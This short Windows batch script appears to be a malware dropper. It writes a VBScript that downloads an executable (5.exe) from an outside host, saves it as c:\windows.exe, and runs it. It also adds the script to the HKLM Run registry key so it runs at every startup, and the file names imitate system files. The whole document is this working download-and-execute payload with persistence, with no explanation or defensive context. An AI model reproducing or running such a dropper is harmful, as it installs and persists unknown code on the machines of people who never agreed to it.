echo Set xPost = createObject("Microsoft.XMLHTTP") >c:\windows.vbs
echo xPost.Open "GET","http://www.genwjq.com/vbs/5.exe",0 >>c:\windows.vbs
echo xPost.Send() >>c:\windows.vbs
echo Set sGet = createObject("ADODB.Stream") >>c:\windows.vbs
echo sGet.Mode = 3 >>c:\windows.vbs
echo sGet.Type = 1 >>c:\windows.vbs
echo sGet.Open() >>c:\windows.vbs
echo sGet.Write(xPost.responseBody) >>c:\windows.vbs
echo sGet.SaveToFile "c:\windows.exe",2 >>c:\windows.vbs
echo Set objShell = CreateObject("Wscript.Shell") >>c:\windows.vbs
echo objshell.run """c:\windows.exe""" >>c:\windows.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "c:\windows.vbs" /f
c:\windows.vbs